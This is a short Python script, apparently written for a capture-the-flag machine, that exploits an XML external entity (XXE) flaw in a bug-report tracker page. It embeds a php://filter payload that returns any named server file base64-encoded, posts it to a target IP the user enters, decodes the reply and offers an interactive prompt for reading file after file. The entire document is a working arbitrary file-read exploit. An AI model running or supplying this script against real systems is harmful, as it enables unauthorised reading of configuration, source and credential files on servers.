#!/usr/bin/env python3

import base64,cmd
import urllib.parse, requests
import xml.etree.ElementTree as ET
from bs4 import BeautifulSoup

url = ""
headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}

def getFile(fname):
	payload = f"""<?xml version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={ fname }"> ]>
			<bugreport>
			<title>&xxe;</title>
			<cwe>cwe</cwe>
			<cvss>600</cvss>
			<reward>1234</reward>
			</bugreport>"""
	
	payload = {'data': base64.b64encode(payload.encode())}
	r = requests.post(url, data=payload, headers=headers)
	output = BeautifulSoup(r.text, "lxml")
	root = ET.fromstring(str(output.find("table")))
	return base64.b64decode(root[0][1].text).decode()

class XxePoc(cmd.Cmd):
	prompt = 'xxe >'
	def default(self, args):
		print(getFile(args))

if __name__ == '__main__':
	ip = input("targe ip:")
	url = f"http://{ ip }/tracker_diRbPr00f314.php"
	XxePoc().cmdloop()
